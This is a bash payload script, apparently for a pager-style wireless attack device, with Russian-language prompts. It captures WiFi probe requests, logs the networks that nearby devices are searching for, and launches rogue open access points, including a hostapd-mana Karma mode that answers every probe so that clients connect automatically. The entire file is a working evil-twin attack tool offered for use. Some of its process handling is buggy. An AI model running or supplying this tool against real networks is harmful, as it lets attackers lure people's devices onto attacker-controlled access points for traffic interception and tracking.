#!/bin/bash
# Title: Probe Attack
# Author: NullSec
# Description: Exploits probe requests to lure clients by creating matching APs
# Category: nullsec/attack

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/probeattack"
mkdir -p "$LOOT_DIR"

PROMPT "АТАКА НА PROBE-ЗАПРОСЫ

Перевыхватите probe-запросы
и создавайте соответствующие
AP для привлечения клиентов.

Возможности:
- Перехват probe-запросов
- Автосоздание AP
- Логирование клиентов
- Сбор SSID
- Karma-стиль ответ

ВНИМАНИЕ: Активная атака.

Нажмите OK для настройки."

# Check dependencies
MISSING=""
command -v airodump-ng >/dev/null 2>&1 || MISSING="${MISSING}aircrack-ng "
command -v hostapd >/dev/null 2>&1 || command -v hostapd-mana >/dev/null 2>&1 || MISSING="${MISSING}hostapd "

if [ -n "$MISSING" ]; then
    ERROR_DIALOG "Отсутствуют инструменты: $MISSING

Установите через opkg."
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "Нет интерфейса монитора!

airmon-ng start wlan1"; exit 1; }

# Find AP-capable interface
AP_IFACE=""
for iface in $IFACE wlan2; do
    [ -d "/sys/class/net/$iface" ] && AP_IFACE="$iface" && break
done
[ -z "$AP_IFACE" ] && AP_IFACE="$IFACE"

PROMPT "РЕЖИМ АТАКИ:

1. Пассивный сбор проб
2. Целевое создание AP
3. Массовые AP (топ-пробы)
4. Karma (ответ всем)

Мониторинг: $MONITOR_IF
AP интерфейс: $AP_IFACE

Выберите режим."

ATTACK_MODE=$(NUMBER_PICKER "Режим (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_MODE=1 ;; esac

SCAN_DURATION=$(NUMBER_PICKER "Время сканирования (сек):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ НА PROBE?

Режим: $ATTACK_MODE
Сканирование: ${SCAN_DURATION}с
Мониторинг: $MONITOR_IF
AP: $AP_IFACE

Подтвердить?"
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
PROBE_LOG="$LOOT_DIR/probes_$TIMESTAMP.log"
CLIENT_LOG="$LOOT_DIR/clients_$TIMESTAMP.log"

# Этап 1: Перехват probe-запросов
LOG "Перехват probe-запросов..."
SPINNER_START "Прослушивание probe-запросов..."

PROBE_FILE="/tmp/probes_$$"
timeout "$SCAN_DURATION" tcpdump -i "$MONITOR_IF" -e -s 256 type mgt subtype probe-req 2>/dev/null | \
    grep -oE "Probe Request \(.*\)" | sed 's/Probe Request (\(.*\))/\1/' | sort | uniq -c | sort -rn > "$PROBE_FILE"

# Also capture with airodump if possible
AIRODUMP_CSV="/tmp/airodump_$$"
timeout "$SCAN_DURATION" airodump-ng "$MONITOR_IF" --output-format csv -w "$AIRODUMP_CSV" 2>/dev/null &
AIRO_PID=$!
sleep "$SCAN_DURATION"
kill $AIRO_PID 2>/dev/null

SPINNER_STOP

PROBE_COUNT=$(wc -l < "$PROBE_FILE" 2>/dev/null | tr -d ' ')
TOP_PROBES=$(head -10 "$PROBE_FILE")

# Save probe log
cp "$PROBE_FILE" "$PROBE_LOG"

PROMPT "PROBE-ЗАПРОСЫ ПЕРЕХВАЧЕНЫ: $PROBE_COUNT

Топ запрашиваемых SSID:
$TOP_PROBES

Нажмите OK для продолжения."

case $ATTACK_MODE in
    1) # Passive harvest only
        PROMPT "СБОР PROBE ЗАВЕРШЁН

Перевыхвачено $PROBE_COUNT
уникальных SSID от
клиентских probe-запросов.

Сохранено: $PROBE_LOG

Нажмите OK для выхода."
        ;;

    2) # Targeted AP creation
        TARGET_SSID=$(TEXT_PICKER "SSID для подделки:" "$(head -1 "$PROBE_FILE" | awk '{$1=""; print}' | xargs)")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

        SPINNER_START "Создание rouge AP..."

        # Конфигурация hostapd
        HOSTAPD_CONF="/tmp/probe_hostapd_$$.conf"
        cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
ssid=$TARGET_SSID
channel=6
hw_mode=g
auth_algs=1
wmm_enabled=0
EOF
        hostapd "$HOSTAPD_CONF" -B 2>/dev/null
        HOSTAPD_PID=$!
        SPINNER_STOP

        PROMPT "ROUGE AP АКТИВНА

SSID: $TARGET_SSID
Интерфейс: $AP_IFACE

Ожидание подключения
клиентов...

Нажмите OK для остановки."

        kill $HOSTAPD_PID 2>/dev/null
        rm -f "$HOSTAPD_CONF"
        ;;

    3) # Массовые AP - топ probe-запрашиваемых SSID
        MAX_APS=$(NUMBER_PICKER "Макс AP (1-5):" 3)
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_APS=3 ;; esac

        SPINNER_START "Создание нескольких AP..."

        HOSTAPD_CONF="/tmp/probe_mass_$$.conf"
        SSID_LIST=""
        COUNT=0

        while IFS= read -r line && [ $COUNT -lt $MAX_APS ]; do
            SSID=$(echo "$line" | awk '{$1=""; print}' | xargs)
            [ -z "$SSID" ] && continue
            SSID_LIST="${SSID_LIST}${SSID}\n"
            COUNT=$((COUNT + 1))
        done < "$PROBE_FILE"

        # Использование первого SSID для одной AP (multi-SSID требует спецнастройки)
        FIRST_SSID=$(echo -e "$SSID_LIST" | head -1)
        cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
ssid=$FIRST_SSID
channel=6
hw_mode=g
auth_algs=1
EOF
        hostapd "$HOSTAPD_CONF" -B 2>/dev/null
        HOSTAPD_PID=$!
        SPINNER_STOP

        PROMPT "МАССОВЫЕ AP АКТИВНЫ

Вещание SSID:
$(echo -e "$SSID_LIST" | head -5)

Ожидание клиентов...

Нажмите OK для остановки."

        kill $HOSTAPD_PID 2>/dev/null
        rm -f "$HOSTAPD_CONF"
        ;;

    4) # Режим Karma
        SPINNER_START "Запуск атаки Karma..."

        if command -v hostapd-mana >/dev/null 2>&1; then
            KARMA_CONF="/tmp/karma_$$.conf"
            cat > "$KARMA_CONF" << EOF
interface=$AP_IFACE
ssid=FreeWiFi
channel=6
hw_mode=g
auth_algs=1
enable_karma=1
karma_loud=1
EOF
            hostapd-mana "$KARMA_CONF" -B 2>/dev/null
            KARMA_PID=$!
        else
            # Запасной вариант: создание открытой AP с обычным SSID
            KARMA_CONF="/tmp/karma_$$.conf"
            cat > "$KARMA_CONF" << EOF
interface=$AP_IFACE
ssid=FreeWiFi
channel=6
hw_mode=g
auth_algs=1
EOF
            hostapd "$KARMA_CONF" -B 2>/dev/null
            KARMA_PID=$!
        fi
        SPINNER_STOP

        PROMPT "АТАКА KARMA АКТИВНА

Ответ на все
probe-запросы.

Клиенты автоматически
подключатся к нашей AP.

Нажмите OK для остановки."

        kill $KARMA_PID 2>/dev/null
        rm -f "$KARMA_CONF"
        ;;
esac

# Очистка
rm -f "$PROBE_FILE" "${AIRODUMP_CSV}"*

PROMPT "АТАКА НА PROBE ЗАВЕРШЕНА

Пeреxвачено probe-запросов: $PROBE_COUNT
Логи сохранены в:
$LOOT_DIR/

Нажмите OK для выхода."
